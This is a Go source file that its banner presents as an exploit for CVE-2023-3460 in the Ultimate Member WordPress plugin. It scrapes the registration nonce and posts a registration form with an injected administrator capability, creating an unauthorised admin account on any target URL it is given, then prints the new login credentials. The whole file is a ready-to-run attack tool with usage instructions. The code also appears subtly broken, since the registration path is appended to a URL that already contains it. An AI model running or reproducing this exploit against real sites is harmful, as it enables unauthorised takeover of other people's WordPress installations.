package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"strings"

	"github.com/fatih/color"
	"golang.org/x/net/html"
)

// Target credentials
const formID = 6

func getNonce(target string) (string, error) {
	resp, err := http.Get(fmt.Sprintf("%s/index.php/register/", target))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	z := html.NewTokenizer(resp.Body)
	re := regexp.MustCompile(`name="_wpnonce" value="(.{10})"`)

	for {
		tt := z.Next()
		switch tt {
		case html.ErrorToken:
			return "", z.Err()
		case html.SelfClosingTagToken, html.StartTagToken:
			t := z.Token()
			if t.Data == "input" {
				for _, attr := range t.Attr {
					if attr.Key == "name" && attr.Val == "_wpnonce" {
						z.Next()
						return re.FindStringSubmatch(t.String())[1], nil
					}
				}
			}
		}
	}
}

func addAdmin(session *http.Client, target string, username string, password string, email string) error {
	fmt.Print(color.Reset, "Adding a new admin: ")

	nonce, err := getNonce(fmt.Sprintf("%s/index.php/register/", target))
	if err != nil {
		return err
	}

	data := fmt.Sprintf("user_login-%d=%s&user_email-%d=%s&user_password-%d=%s&confirm_user_password-%d=%s&first_name-%d=Robert&last_name-%d=bySecragon&form_id=%d&um_request=&_wpnonce=%s&wp_capabilities[administrator]=1",
		formID, username, formID, email, formID, password, formID, password, formID, formID, formID, nonce)

	resp, err := session.Post(fmt.Sprintf("%s/index.php/register/", target), "application/x-www-form-urlencoded", strings.NewReader(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusFound {
		fmt.Println(color.GreenString("done"))
	} else {
		return fmt.Errorf("There is a error adding admin...")
	}

	return nil
}

func main() {
	color.Set(color.FgBlue)
	fmt.Println("\t\t ---- CVE-2023-3460 Ultimate Member ----")
	fmt.Println("\t\t   (Unauthorized admin access)")
	color.Set(color.FgRed)
	fmt.Println("\t\t\t\t\tAdapted to Golang by BlackReaperSK (based on @gbrsh xpl)")
	color.Unset()

	target := flag.String("url", "", "URL of the target WordPress site (e.g., http://wphost.com)")
	username := flag.String("u", "", "Username for the new admin")
	password := flag.String("p", "", "Password for the new admin")
	email := flag.String("email", "", "Email for the new admin")

	flag.Parse()

	if *target == "" || *username == "" || *password == "" || *email == "" {
		fmt.Println()
		fmt.Println("Usage: go run CVE-2023-3460.go -url=http://wphost.com -u=username -p=password --email=email")
		fmt.Println()
		flag.PrintDefaults()
		fmt.Println()
		return
	}

	if err := addAdmin(http.DefaultClient, *target, *username, *password, *email); err != nil {
		log.Fatal(err)
	}

	fmt.Println()
	fmt.Println(color.Reset, "All set! You can now login using the following credentials:")
	fmt.Printf("Username: %s\n", *username)
	fmt.Printf("Password: %s\n", *password)
	fmt.Println()
}
